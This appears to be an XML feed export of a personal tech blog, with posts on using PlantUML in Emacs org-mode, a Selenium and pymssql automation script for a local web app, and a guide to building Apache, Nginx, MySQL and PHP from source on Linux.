什么是 PlantUML?PlantUML是一个快速创建UML图形的组件。下面是一个简单的示例：代码：#+BEGIN_SRC plantuml :file http://localhost:4000/assets/images/orgmode-babel-sequenceuml.png    Alice -&gt; Bob: synchronous call    Alice -&gt;&gt; Bob: asynchronous call在线Demo服务4.5.2 配置 Emacs 支持 PlantUML下载 plantuml.jar 到你的硬盘上官网下载页面安装生成图片用的软件：Graphviz$ sudo apt install graphviz配置 Emacs 支持 PlantUML首先，将下载的 plantuml.jar 文件放到 ~/.emacs.d/plantuml/ 目录下；其次，打开 ~/.emacs.d/init.el 文件，添加配置加载 PlantUML；1: ;; Load plantuml2: (setq org-plantuml-jar-path3: (expand-file-name "~/.emacs.d/plantuml/plantuml.jar"))最后在 ~/.emacs 或 ~/.emacs.d/init.el 中，添加配置语言。1: ;; active Org-babel languages2: (org-babel-do-load-languages3: 'org-babel-load-languages4: '(;; other Babel languages5: (plantuml . t))) ;; add this linePlantUML mode for EmacsM-x package-install &lt;RET&gt;plantuml-mode &lt;RET&gt;M-x customize-variable &lt;RET&gt;plantuml-jar-path &lt;RET&gt;4.5.3 PlantUML 使用顺序图(Sequence Diagram)简单示例顺序图用 -&gt; , &#x2013;&gt;, &lt;-, &lt;&#x2013; 来绘制参与者（Participants）之 间的消息（Message）。#+BEGIN_SRC plantuml :file http://localhost:4000/assets/images/plantuml-quickstart-s1.pngAlice -&gt; Bob: Authentication RequestBob --&gt; Alice: Authentication ResponseAlice -&gt; Bob: Another atuhentication RequestAlice &lt;-- Bob: Another authentication Response注释使用  ' 进行单行/多行注释申明参与者使用 participant 关键词，也可以使用下面的参与者 分类关键词来申明参与者：actorboundarycontrolentitydatabase不同的参与者类型，其图标也是不一样的：使用 as 关键词可以为参与者起一个别名(显示申明)采用引号来申明参与者(隐示申明)发送消息给自己(Message to Self)一个参与者可以给自己发送消息，消息名如果需要有多行文本，可以用 \n 来表示换行。改变箭头(Arrow)样式(Style)在用例图里可以通过以下方式来改变箭头的样式：使用 \ 或 / 来替换 &lt; 或 &gt; 可以让箭头只显示上半部分或下半 部分。重复输入箭头或斜杠（ &gt;&gt; // ），用来绘制空心箭头。使用双横线 &#x2013; 替代 - 可以用来绘制点线。在箭头后面加个 o 可以在箭头前绘制一个圆圈。使用 &lt;-&gt; 可用来绘制双向箭头。颜色(Color)要改变箭头的颜色，可以使用HTML颜色符号消息序号(Message sequence numbering)使用关键词 autonumber 给消息添加上序号。如果需要指定一个起始号码，可以直接在 autonumber 后面加个数字就行 了，如果要设置自增量，再在后面加一个数字就行了（ autonumber start increment ）。也可以为序号指定数字格式，这个格式化的过程实际上是Java类 DecimalFormat 来执行的（ 0 表示数字， # 缺省补零位数）。同样的，也可以使用一些HTML标签来控制数字的样式。标题(Title)要给图形加一个标题可以用 title 关键词来设置。图形图例(Legend the diagram)使用 legend 和 end legend 关键词可以设置图形的图例。图例可以设 为左对齐、右对齐和居中对齐。分割图形(Splitting diagrams)关键词 newpage 是用来把图形分割成几个图片的。每一个被分割出来的 图片可以看作是一个新的页面（ new page ），如果要给新的页面添加一 个标题，可以紧跟在关键词 newpage 之后来设置。消息(Message)分组(Grouping)可以使用下面的关键词来实现：alt/elseoptloopparbreakcriticalgroup, 这个关键词后面的文字会作为组名显示在图形上上面的关键词后可以添加一些文本用来显示在头部（注： group 除外，因 为它后面的文本用来显示在组名称的位置）。在组嵌套组的结构里可以用关 键词 end 来关闭组或者说是表示一个组符号的结束符（类似 if/endif ）。注解(Notes)使用 note left 或 note right 关键词一些其他的注解方式(Some other notes)通过使用关键词 note left of ， note right of 或 note over，可以把注解放置在与之相关的参与者的左边或右边，或下方。如果要使用多行注解，可以使用关键词 end note 来表示注解的结束。使用HTML进行格式化(Formatting using HTML)可以使用少量的HTML标签来格式化文本：&lt;b&gt; 加粗文本&lt;u&gt; 或 &lt;u:#AAAAAA&gt; 或 &lt;u:colorName&gt; 用来加下划线&lt;i&gt; 斜体&lt;s&gt; 或 &lt;s:#AAAAAA&gt; 或 &lt;s:colorName&gt; 用来加删除线&lt;w&gt; 或 &lt;w:#AAAAAA&gt; 或 &lt;w:colorName&gt; 用来加波浪线&lt;color:#AAAAAA&gt; 或 &lt;color:colorName&gt; 用来设置文本颜色&lt;back:#AAAAAA&gt; 或 &lt;back:colorName&gt; 用来设置背景色&lt;size:nn&gt; 设置字体大小&lt;img src="file"&gt; 或 &lt;img:file&gt; 用来添加图片，图片文件必须 是可以访问得到才行。&lt;img src="http://url"&gt; 或 &lt;img:http://url&gt; 用来添加一个互 联网图片，同样的图片地址必须是可用的才行。用例图(Use Case Diagram)用例(Usecase)用例可以用一对小括号括起来表示，也可以使用 usecase 关键词来定义。用例也可以通过使用 as 关键词来设置别名参与者(Actors)定义参与者时，可以把参与者的名称放在两个冒号的中间，也可以用 actor 关键词来定义参与者。同样参与着也可以使用别名。示例类图(Class Diagram)示例1活动图(Activity Diagram)简单活动(Simple Activity)使用 (*) 来表示活动开始点和结束点。使用 --&gt; 来表示箭头。带标注的箭头(Label on arrows)可以通过方括号 [labels] 来设置标注改变箭头的方向(Changing arrow direction)可以使用 -&gt; 创建一个水平箭头，也可以通过下面的方式来改变箭头 的方向：-down-&gt; 向下（这个是默认的，等同于 =–&gt;=）-right-&gt; 向右-left-&gt; 向左-up-&gt; 向上在描述箭头时， up|down|left|right 这几个单词的写法可以简化， 用单词开头的一个或两个字母来替换就行了，比如 -down-&gt; 也可以写成 -d-&gt; 或者 -do-&gt; 。分支(Branches)可以使用 if/then/else 关键词来定义分支。多分支(More on Branches)同步块(Synchronization)同步块可以用“=== code ===”来表示。实例长文本的活动描述(Long activity description)在定义活动的时候，有时候需要用多行文字来描述这个活动，这时我们可以 在描述里添加换行符 \n ，也可以使用少量的HTML标签。以下是可以使用的HTML标签： or  to change font size or  or  to include an image在图形定义脚本中可以直接使用别名注释(Notes)可以通过在脚本里使用 note 来添加注释文本块。note leftnote rightnote topnote bottom用上面列表里的命令来标注一个注释块的开始，然后用 end note 来标注注释块的结束。分区(Partition)通过分区关键词 partition 可以定义一个分区，并且可以使用HTML的 颜色码或颜色名来设置分区的背景色。使用 end partitio 关闭分区定义。图形标题(Title the diagram)标题关键词 title 用来设置一个图形的标题文本，我们可以在 title 和 end title 两个关键词之间放置比较长的标题文本。皮肤(Skinparam)皮肤命令 skinparam 可以改变图形的颜色和字体。这些命令可以在以下 的位置中使用：在图形定义里使用在包含的文件里使用在一个配置文件里使用，这个配置文件一般由命令行或ANT的Task来提供。完整示例(Complete Example)活动图Beta版本Beta版本的活动图简化了活动图的符号定义，从 V7947 这个版本开始， PlantUML就开始引入了一些简化写法，当然到目前（20140627）为止还不是 很完善，但这个版本里的一些简化写法已经是PlantUML后续版本的发展方向。在使用新的写法之前需要把 GraphViz 更新到最新版本。简单活动（Simple Activity）活动元素从一个 : 开始，然后到一个 ; 结束。 开始和结束符号，可以用 start 和 end 两个关键词来表示。之前版 本的开始和结束符都是用同一个符号 (*) 来表示的。4.5.4 快捷键(Keyboard)Table 15: Default key bindings快捷键描述C-c C-cplantuml-preview: renders a PlantUML diagram from the current buffer in the best supported formatC-u C-c C-cplantuml-preview in other windowC-u C-u C-c C-cplantuml-preview in other frame5 问题解决(Solving Problem)5.1 emacs 不能输入中文(Don't input chinese character)//编辑~/.bashrc文件，加入如下内容：$ vim ~/.bashrcLC_CTYPE="zh_CN.utf8"//编辑/etc/environment文件，加入如下内容：$ sudo vim /etc/environmentLC_CTYPE="zh_CN.utf8"5.2 Warning (server): Unable to start the Emacs server问题描述Warning (server): Unable to start the Emacs serverThere is an existing Emacs server, named "server".To start the server in this Emacs process, stop the existingserver or call ‘M-x server-force-delete’ to forcibly disconnect it.问题解决打开 init.el 或 .emacs 文件，注释以下代码：（这只是临时解决办法，肯定有更好的解决方式，暂时未找到）(server-start)(setq server-socket-dir "~/.emacs.d/server")参考资料39 Using Emacs as a Server6 Referencesorg-mode: 最好的文档编辑利器emacs 百度百科emacs wikiPlantUML Official SiteUsing plantuml to make diagrams in org-mode使用Emacs敲出UML，PlantUML快速指南强大的 Org modegithub plantuml-modeorg-mode的一些小技巧]]></content>
      <categories>
        
          <category> software </category>
        
      </categories>
      <tags>
        
          <tag> GNU-Emacs </tag>
        
          <tag> org-mode </tag>
        
          <tag> PlantUML </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[To Learn Python from Selenium]]></title>
      <url>/python/2016/05/23/selenium-with-python/</url>
      <content type="text"><![CDATA[1 Getting Started1.1 What is Python?Python is a general-purpose interpreted, interactive, object-oriented, and high-level programming language.#!/usr/bin/python3print("Hello, Python!")1.2 Installation1.2.1 Downloading and Installing Selenium&gt;pip install seleniumNote:"Script" dir. not's found in Python 3.3 version after installation.Following is solution(Installing easy_install and pip):     Step1,To https://pypi.python.org/pypi/setuptools Download ez_setup.py;     Step2,&gt;python ez_setup.py     Step3,&gt;easy_install pip .Or Directly dowload pip-9.0.1.tar.gz,&gt;python setup.py install--Updating pip&gt;python -m pip install --upgrade pip1.2.2 Installing pymssql&gt;pip install pymssql2 Connecting SQL Server by pymssql2.1 sqlserver classsql_server.py######SQL Server class.#####import pymssqlclass sqlserver:	#Connect.	def __init__(self,host,user,password,database):		#server url or ip.		self.host = host		#User name.		self.user = user		#Password.		self.password = password		#Database.		self.database=database	def __get_connect(self):		#Connect SQL Server.		if not self.database:			raise(NameError,"没有连接数据库信息")		self.conn = pymssql.connect(self.host, self.user, self.password, self.database,charset="utf8")		cursor = self.conn.cursor()		if not cursor:			raise(NameError,"未能连接到数据库，请检查!")		else:			return cursor	#Close connect.	def conn_closed(self):		self.conn.close()	#Query data.	def query(self,sql):		cur=self.__get_connect()		cur.execute(sql)		dataList=cur.fetchall()		self.conn_closed() #Closing connect.		return dataList2.2 test.pyfrom selenium import webdriverfrom selenium.webdriver.common.keys import Keysfrom splinter.browser import Browserfrom time import sleepfrom sql_server import sqlserver#Logindef login(driver):	driver.get("http://localhost:8080/chicago/")	#Enter to user name.	userName=driver.find_element_by_name("userName")	userName.send_keys("admin")	sleep(1)	#Enter to pwd.	password=driver.find_element_by_name("password")	password.send_keys("123456")	sleep(1)	#Login to site.	password.send_keys(Keys.RETURN)#Get out data of vehicle. def get_out_card_data(conn):	cardInfo=conn.query("SELECT io.card_no from chicago_io io where card_no like 'dm16%' and io.out_time is NULL order by io.card_no")	return cardInfo#Begin outdef begin_out(driver,outData):	driver.find_element_by_xpath("//div[@id='ext-gen20']/div[@id='002']").click()	driver.find_element_by_link_text("车辆进出管理").click()	driver.find_element_by_link_text("车辆出场操作").click()	sleep(5)	card_no=driver.find_element_by_name("truckIo.cardNo")	submit_button=driver.find_element_by_id("ext-gen26")	for card in outData:		card_no.send_keys(card)		submit_button.click()		sleep(3)#Begin in#def begin_in(inData):#maindef main():	driver=webdriver.Chrome()	#Login site.	login(driver)	#Connection.	conn=sqlserver("localhost","sa","123456","chicago5")	#Get data of vehicle out.	outData=get_out_card_data(conn)	# cardStr=""	# for row in outData:	# 	cardStr+=''.join(row)+","	outList=[]#Out of vehicle list.	inList=[]#In of vehicle list.	number=1	if outData:		for row in outData:			card_no=int(row[0][5:7])			outList.append(card_no)			while (number&lt;50):							if (number!=card_no):					# print(number)					inList.append(number)				number+=1	else:		while (number&lt;50):			inList.append(number)			number+=1	begin_out(driver,outList)	print(inList)if __name__ == "__main__":	main()3 Solving the problem3.1 SyntaxError: Non-ASCII character '\xc2' in fileSolving: add to header of file        #coding:utf-8 or #coding=utf-84 RefrencesSelenium with Pythonpymssqlhttps://wiki.python.org/moin/SQL%20Serverhttps://www.tutorialspoint.com/pythonhttps://www.tutorialspoint.com/python3]]></content>
      <categories>
        
          <category> python </category>
        
      </categories>
      <tags>
        
          <tag> selenium </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Apache/Nginx-MySQL+PHP]]></title>
      <url>/software/linux/2016/03/25/apache-nginx-mysql-php/</url>
      <content type="text"><![CDATA[关于此文档，如果你有任何问题，可以发邮件到我的邮箱，邮箱地址为 zrg1390556487@gmail.com.This is a installation process of "Apache+MySQL+PHP" source packages on linux environment.It's content only  1 前言(Preface)建议根据文档顺序依次安装。2 安装Apache2.1 解压#tar jxvf httpd-2.4.18.tar.bz2#cd httpd-2.4.18/2.2 配置#./configure --prefix=/usr/local/apache2 --enable-so --with-included-apr&#27492;&#26102;&#21487;&#33021;&#20250;&#20986;&#29616;&#22914;&#19979;&#38169;&#35823;&#65292;&#36825;&#26159;&#22240;&#20026;ARP&#21644;ARP-util&#32570;&#22833;&#12290;2.3 安装APR和APR-util&#21040; http://apr.apache.org/download.cgi &#19979;&#36733;apr&#21644;apr-util#tar jxvf apr-1.5.2.tar.bz2#cd apr-1.5.2/#./configure --prefix=/usr/local/apr&#27492;&#26102;&#65292;&#21487;&#33021;&#20250;&#20986;&#29616;libtool&#32570;&#22833;&#65292;&#22914;&#19979;&#22270;&#25152;&#31034;&#12290;&#35299;&#20915;&#21150;&#27861;&#65306; &#23433;&#35013;libtool&#12289;autoconf&#21450;automake&#65306;#zypper in autoconf libtool automake &#28982;&#21518;&#25191;&#34892;&#65306;# autoreconf --force --install       #autoreconf --force --install       #autoreconf --force --install       &#20043;&#21518;&#65292;&#25171;&#24320;configure&#25991;&#20214;(&#29616;&#22312;&#20351;&#29992;&#30340;&#29256;&#26412;&#26159;apr-1.5.2&#65292;30212&#34892;)&#65292;&#27880;&#37322;   $RM -f "$cfgfile"&#65292;&#23601;&#26159;&#22312;&#21069;&#38754;&#28155;&#21152;&#8220;#&#8221;&#12290;&#37325;&#26032;&#25191;&#34892;./configure --prefix=/usr/local/apr&#65292;&#38382;&#39064;&#35299;&#20915;&#12290;&#25104;&#21151;&#26631;&#24535;&#65306;&#32534;&#35793;&#23433;&#35013;apr#make &amp;&amp; make install &#65292;&#25104;&#21151;&#26631;&#24535;&#65306;&#25509;&#19979;&#26469;&#65292;&#23433;&#35013;APR-util&#12290;&#21516;&#26679;&#65292;&#35299;&#21387;&#37197;&#32622;&#65292;&#27880;&#24847;&#20351;&#29992;&#20102;--with-apr&#65306;#tar apr-util-1.5.4.tar.bz2#cd apr-util-1.5.4/# ./configure --with-apr=/usr/local/apr&#25104;&#21151;&#26631;&#24535;&#65306;#make &amp;&amp; make install &#65292;&#25104;&#21151;&#26631;&#24535;&#65306;2.4 运行安装apache（httpd）#./configure --prefix=/usr/local/apache2 --enable-so&#35299;&#20915;&#21150;&#27861;&#65306;&#21040;https://sourceforge.net/projects/pcre/files/ &#19979;&#36733;pcre&#24182;&#23433;&#35013;&#12290;#./configure --prefix=/usr/local/pcre&#25104;&#21151;&#26631;&#24535;&#65306;#make &amp;&amp; make install &#65292;&#25104;&#21151;&#26631;&#24535;&#65306;&#36827;&#20837;apache&#30446;&#24405;&#65292;&#37325;&#26032;&#36816;&#34892;&#37197;&#32622;&#21629;&#20196;&#65306;#./configure --prefix=/usr/local/apache2 --enable-so &#65292;&#38382;&#39064;&#35299;&#20915;&#12290;&#25104;&#21151;&#26631;&#24535;&#65306;#make &amp;&amp; make install &#65292;&#25104;&#21151;&#26631;&#24535;&#65306;至此，Apache安装成功2.5 启动Apache&#22240;&#20026;&#26159;&#28304;&#30721;&#21253;&#23433;&#35013;&#65292;&#25152;&#20197;&#21482;&#33021;&#25191;&#34892;&#19979;&#21015;&#21629;&#20196;&#65306;# /usr/local/apache2/bin/apachectl start&#27492;&#26102;&#65292;&#20986;&#29616;&#19979;&#22270;&#38169;&#35823;&#65292;&#36825;&#26159;&#22240;&#20026;ServerName&#37197;&#32622;&#19981;&#27491;&#30830;&#30340;&#21407;&#22240;&#12290;&#35299;&#20915;&#65306;# vim httpd.confServerName localhost:80&#25913;&#23436;&#21518;&#65292;&#37325;&#21551;apache&#65306;# /usr/local/apache2/bin/apachectl restart&#21487;&#20197;&#26597;&#30475;&#24320;&#21457;&#31471;&#21475;&#21495;&#65306;# netstat -tnlp2.6 设置开机启动# cp /usr/local/apache2/bin/apachectl /etc/init.d# chmod 755 /etc/init.d/apachectl# chkconfig --add apachectl                   &#65307;add&#23545;&#24212;del# chkconfig --level 35 apachectl on        &#65307;on&#23545;&#24212;off# chkconfig --list                    &#65307;&#26174;&#31034;&#24320;&#26426;&#21487;&#20197;&#33258;&#21160;&#21551;&#21160;&#30340;&#26381;&#21153;2.7 配置Virtual Host2.7.1 Configure virtual hostLoadModule vhost_alias_module modules/mod_vhost_alias.so# Virtual hosts Include conf/extra/httpd-vhosts.conf&lt;VirtualHost 127.0.0.1:80&gt;    #directory    DocumentRoot "D:\phpStudy\WWW\ec-shop\gold"    ServerName local.gold    #    ServerAlias www.dummy-host.example.com    #    ErrorLog "logs/dummy-host.example.com-error.log"    #    CustomLog "logs/dummy-host.example.com-access.log" common    DirectoryIndex index.html index.htm index.php    &lt;Directory /&gt;      Options FollowSymLinks      #&#19981;&#35768;&#21487;&#21035;&#20154;&#20462;&#25913;&#25105;&#20204;&#30340;&#39029;&#38754;      AllowOverride None      #&#35774;&#32622;&#35775;&#38382;&#26435;&#38480;      Order allow,deny      Allow from all    &lt;/Directory&gt;&lt;/VirtualHost&gt;127.0.0.1 local.goldExplain:      a.About hosts:a computer file to be used to store information on where to find an internet host on a computer network      b.When the user input a URL in the browser, the system will automatically search for the corresponding IP address         from the Hosts file, once found, the system will immediately open the corresponding page, if not found, then the         system will be submitted to the DNS domain name resolution server IP address.2.7.2 Configure multiple ports and multiple sitesAdd listening port:  Listen 81  Listen 82&lt;VirtualHost *:81&gt;#    ServerAdmin webmaster@dummy-host2.example.com     DocumentRoot "d:\wamp\www\wp-job"     ServerName localhost#    ErrorLog "logs/dummy-host2.example.com-error.log"#    CustomLog "logs/dummy-host2.example.com-access.log" common&lt;/VirtualHost&gt;&lt;VirtualHost *:82&gt;#    ServerAdmin webmaster@dummy-host2.example.com     DocumentRoot "d:\wamp\www\wordpress"     ServerName localhost#    ErrorLog "logs/dummy-host2.example.com-error.log"#    CustomLog "logs/dummy-host2.example.com-access.log" common&lt;/VirtualHost&gt;3 安装Nginx3.1 Nginx 介绍Nginx是一款免费、开源、高效的 HTTP 服务器，Nginx是以稳定著称，丰富的功能，结构简单，低资源消耗。3.2 配置yum源[nginx]name=nginx repobaseurl=http://nginx.org/packages/centos/$releasever/$basearch/gpgcheck=0enabled=13.3 安装(Installing)yum install -y nginx//设置nginx开机自启动systemctl enable nginx.service//启动/停止/重新启动nginxsystemctl start/stop/restart nginx.service3.4 打开 HTTP 和 HTTPS 防火墙端口firewall-cmd –permanent –zone=public –add-service=httpfirewall-cmd –permanent –zone=public –add-service=httpsfirewall-cmd –reload3.5 配置Nginx3.5.1 /etc/nginx/conf.d/default.conf环境要求:能够正常访问网页server {    listen       80;    server_name  localhost;    #charset koi8-r;    access_log  /var/log/nginx/default.access.log  main;    location / {	root   /srv/www;	index  index.php index.html index.htm;    }    error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html {	root   /srv/www;    }    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ {    #    proxy_pass   http://127.0.0.1;    #}    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ {	root           /srv/www;	fastcgi_pass   127.0.0.1:9000;	fastcgi_index  index.php;	fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;	include        fastcgi_params;    }    # deny access to .htaccess files, if Apache's document root    # concurs with nginx's one    #    location ~ /\.ht {	deny  all;    }}3.5.2 /etc/nginx/conf.d/vhosts/finance.conf环境要求：php, ThinkPHP5, pathinfo,  server {    listen       8080;    server_name  localhost;    #charset koi8-r;    access_log  /var/log/nginx/finance.access.log  main;    location / {        root   /srv/www/finance/public;        index  index.php index.html index.htm;        if (!-e $request_filename) {                rewrite  ^(.*)$ /index.php?s=/$1 last;                break;        }    }    error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html {        root   /srv/www;    }    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ {    #    proxy_pass   http://127.0.0.1;    #}    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ {         root           /srv/www/finance/public;         fastcgi_pass   127.0.0.1:9000;         fastcgi_index  index.php;         fastcgi_param  PHP_VALUE  "open_basedir=/srv/www/finance/:/tmp/:/proc/";         fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         include        fastcgi_params;         set $real_script_name $fastcgi_script_name;            if ($fastcgi_script_name ~ "^(.+?\.php)(/.+)$") {            set $real_script_name $1;            set $path_info $2;         }         fastcgi_param SCRIPT_FILENAME $document_root$real_script_name;         fastcgi_param SCRIPT_NAME $real_script_name;         fastcgi_param PATH_INFO $path_info;    }    # deny access to .htaccess files, if Apache's document root    # concurs with nginx's one    #    location ~ /\.ht {        deny  all;    }}3.5.3 nginx问题解决1. 403 Forbidden问题分析：1）检查文件或目录(/srv/www/)权限问题；2）配置检查：访问文件类型，index index.php index.html index.htm2.访问时，出现以下内容：File not found. No input file specified.问题分析：1）检查路径配置是否正确；2）检查php-fpm配置3.3.6 参考资料http://www.nginx.cn/231.htmlhttps://www.nginx.com/https://www.nginx.com/resources/wiki/start/topics/tutorials/install/4 安装MySQL注意：这里下载的是rpm安装包。1.rpm&#23433;&#35013;&#26102;&#65292;&#25253;&#22914;&#19979;&#38169;&#35823;&#65292;&#36825;&#26159;&#22240;&#20026;&#38656;&#35201;&#23433;&#35013;&#36825;&#20123;&#20381;&#36182;&#21253;&#65306;&#25110;&#26159;&#36825;&#26679;&#65306;&#22914;&#26524;&#26159;&#31532;&#19968;&#20010;&#22270;&#25152;&#31034;&#38169;&#35823;&#65292;&#21487;&#20197;&#19979;&#36733;&#23433;&#35013;numactl&#65292;# wget http://mirror.centos.org/centos/6/os/x86_64/Packages/numactl-2.0.9-2.el6.x86_64.rpm# rpm -ivh numactl-2.0.9-2.el6.x86_64.rpm&#22914;&#26524;&#26159;&#31532;&#20108;&#20010;&#22270;&#25152;&#31034;&#38169;&#35823;&#65292;&#21487;&#20197;#rpm -ivh glibc-2.17-4.17.1.x86_64.rpm --force&#25509;&#30528;&#20381;&#27425;&#23433;&#35013;mysql&#38468;&#24102;&#36719;&#20214;&#65306;# rpm -ivh mysql-community-libs-5.6.28-2.sles12.x86_64.rpm# rpm -ivh mysql-community-client-5.6.28-2.sles12.x86_64.rpm# rpm -ivh mysql-community-common-5.6.28-2.sles12.x86_64.rpm# rpm -ivh mysql-community-server-5.6.28-2.sles12.x86_64.rpm&#22312;&#27492;&#23433;&#35013;&#36807;&#31243;&#20013;&#65292;&#21487;&#33021;&#24050;&#32463;&#23433;&#35013;&#23427;&#20854;&#20182;&#29256;&#26412;&#30340;mysql&#65292;&#21487;&#20197;&#36890;&#36807;&#21024;&#38500;&#20854;&#20182;&#29256;&#26412;&#65292;&#22312;&#36827;&#34892;&#23433;&#35013;&#12290;安装完成后，可以通过 # mysql_secure_installation 命令设置root用户密码。4.1 安装MariaDB//非源码安装方式yum install mariadb mariadb-server net-tools5 安装PHP5.1 安装php扩展5.1.1 jpeg&#23448;&#32593;&#19979;&#36733;&#22320;&#22336;&#65306;http://www.ijg.org/&#23433;&#35013;&#26102;&#38656;&#35201;&#22312;&#23433;&#35013;&#30446;&#24405;jpeg&#19979;&#26032;&#24314;bin&#65292;include&#65292;lib&#65292;man/man1&#30446;&#24405;&#12290;#tar -zvxf jpegsrc.v6b.tar.gz#cd jpeg-6b#CFLAGS="-O3 -fPIC" ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static&#27492;&#26102;&#21487;&#33021;&#20250;&#25253;&#20986;&#29616;&#22914;&#19979;&#38169;&#35823;&#65306;&#35299;&#20915;&#65306;&#22797;&#21046;config.guess&#21644;config.sub&#21040;&#23433;&#35013;&#30446;&#24405;&#19979;#cp /usr/share/libtool/config/config.guess ./#cp /usr/share/libtool/config/config.sub ./&#20877;&#27425;&#25191;&#34892;&#19978;&#38754;&#30340;&#37197;&#32622;&#35821;&#21477;&#12290;&#38382;&#39064;&#35299;&#20915;&#12290;&#20351;&#29992;64&#20301;&#20989;&#25968;&#24211;&#32534;&#35793;&#23433;&#35013;&#65306;make libdir=/usr/lib64 &amp;&amp; make libdir=/usr/lib64 install&#25104;&#21151;&#26631;&#24535;&#65306;5.1.2 libpnglibpng&#26080;&#38656;&#37197;&#32622;#cp scripts/makefile.std makefile#vim makefile &#25214;&#21040;CFLAGS&#65292;&#21152;&#20837;-O3 -fPIC -I$(ZLIBINC)#make &amp;&amp; make install&#27492;&#26102;&#65292;&#21487;&#33021;&#20250;&#20986;&#29616;&#38169;&#35823;&#65292;&#35299;&#20915;&#65306;&#20808;&#25226;Zlib&#23433;&#35013;&#20102;&#65292;&#22312;&#37325;&#26032;&#23433;&#35013;libpng&#65292;&#22914;&#26524;&#20173;&#28982;&#25253;&#38169;&#65292;&#36816;&#34892;&#23433;&#35013;zlib-devel rpm -ivh zlib-devel-1.2.8-5.1.2.x86_64.rpm重新编译出现下图提示信息，此时只需执行下面两个命令即可：#make clean&#22312;&#36816;&#34892;&#19968;&#19979;&#65306;#ldconfig    #&#21160;&#24577;&#38142;&#25509;&#24211;&#31649;&#29702;&#21629;&#20196;&#65292;5.1.3 freetypeFreetypr:http://download.savannah.gnu.org/releases/freetype/freetype-2.3.5.tar.gz# ./configure --prefix=/usr/local/freetype&#25104;&#21151;&#26631;&#24535;&#65306;#make &amp;&amp; make install&#25104;&#21151;&#26631;&#24535;&#65306;5.1.4 zlib#./configure --prefix=/usr/local/zlib&#25104;&#21151;&#26631;&#24535;&#65306;#make &amp;&amp; make install&#25104;&#21151;&#26631;&#24535;&#65306;5.1.5 gdCFLAGS="-O3 -fPIC" ./configure --prefix=/usr/local/gd --with-jpeg=/usr/local/jpeg  --with-png=/usr/local/lib --with-zlib=/usr/local/zlib --with-freetype=/usr/local/freetype&#25104;&#21151;&#26631;&#24535;&#65306;&#32534;&#35793;&#23433;&#35013;&#65306;# make &amp;&amp; make install&#21487;&#33021;&#20250;&#25253;&#22914;&#19979;&#38169;&#35823;&#65292;&#26816;&#26597;libpng&#26159;&#21542;&#23433;&#35013;&#27491;&#30830;&#12290;&#23433;&#35013;&#23436;&#25104;&#26631;&#24535;&#65306;5.1.6 curl下载地址 http://curl.haxx.se/#./configure --prefix=/usr/local/curl#make &amp;&amp; make install ，成功标志:5.2 安装php$ tar zxvf php-5.4.45.tar.gz$ cd php-5.4.45$ ./configure --prefix=/usr/local/php \--with-apxs2=/usr/local/apache2/bin/apxs \--with-gd \--with-jpeg-dir=/usr/local/jpeg6 \--with-zlib-dir=/usr/local/zlib \--with-png-dir=/usr/local/lib \--with-freetype-dir=/usr/local/freetype \--with-curl=/usr/local/curl \--with-mysql \--with-pdo-mysql \--with-mysqli --enable-ftp \--with-pcre-regex \--with-mhash \--enable-fpm \--enable-mbstring \--enable-sockets \--enable-sysvsem \--enable-sysvshm \--enable-pcntl \--enable-mbregex \--enable-zip \--enable-fileinfo \此时，会报下图错误，解决办法就是安装zlib-devel，# zypper in libxml2-devel -y重新执行上面的配置命令。出现字样"Thank you for using PHP."，表示成功了。成功标志：编译安装：# make &amp;&amp; make install成功标志：5.3 检测PHP是否安装成功&#35831;&#26816;&#26597;httpd.conf&#25991;&#20214;&#20013;&#65292;&#19979;&#38754;&#20004;&#34892;&#20195;&#30721;&#26159;&#21542;&#24050;&#28155;&#21152;&#65306;LoadModule php5_module        modules/libphp5.so...AddType application/x-httpd-php .phpAddType application/x-httpd-php-source .phps...&lt;IfModule dir_module&gt;DirectoryIndex index.php index.html&lt;/IfModule&gt;&#32534;&#36753;&#23436;&#25104;&#21518;&#65292;&#37325;&#21551;apache&#65306; /etc/init.d/apachectl restart&#21019;&#24314;&#21644;&#32534;&#36753;php.ini&#65306;#cp php.ini-development /usr/local/php/lib64/#cd  /usr/local/php/lib64/#cp php.ini-development php.ini#vim php.ini&#26032;&#24314;&#25991;&#20214;&#26597;&#30475;phpinfo&#26159;&#21542;&#37117;&#24050;&#21152;&#36733;&#24182;&#27491;&#24120;&#26174;&#31034;&#65292;&lt;?phpphpinfo();?&gt;5.4 bcmath扩展安装&#20063;&#35768;&#36825;&#20010;&#25193;&#23637;&#20250;&#29992;&#21040;&#12290;&#19968;&#33324;&#24773;&#20917;&#19979;&#36825;&#20010;&#25193;&#23637;&#22312;php&#23433;&#35013;&#30340;&#26102;&#20505;&#65292;&#26159;&#23384;&#22312;&#23433;&#35013;&#21253;&#20013;ext/bcmath&#30446;&#24405;&#19979;&#12290;&#21033;&#29992;phpize&#36827;&#34892;&#23433;&#35013;&#26032;&#30340;php&#25193;&#23637;&#12290;#cd ext/bcmath/#/usr/local/php/bin/phpize                    &#65307;&#25191;&#34892;(phpize&#30340;&#36335;&#24452;&#26681;&#25454;&#21508;&#33258;&#23433;&#35013;&#26377;&#25152;&#19981;&#21516;)#find /usr/local/php/ -name php-config                &#65307;&#20808;&#26597;&#25214;php-config&#22312;&#21738;&#20010;&#22320;&#26041;#./configure --with-php-config=/usr/local/php/bin/php-config          &#65307;&#37197;&#32622;bcmath# make# make install# find /usr/local/php/ -name bcmath.so            &#65307;&#26597;&#30475;bcmath.so&#22312;&#37027;&#20010;&#36335;&#24452;&#19979;&#29616;&#22312;&#37197;&#32622;php&#65292;&#21046;&#23450;&#25193;&#23637;&#36335;&#24452;&#21450;&#21152;&#36733;so&#25991;&#20214;&#65306;需要安装其他扩展，使用同样的操作。&#29305;&#21035;&#25552;&#31034;1&#65306; 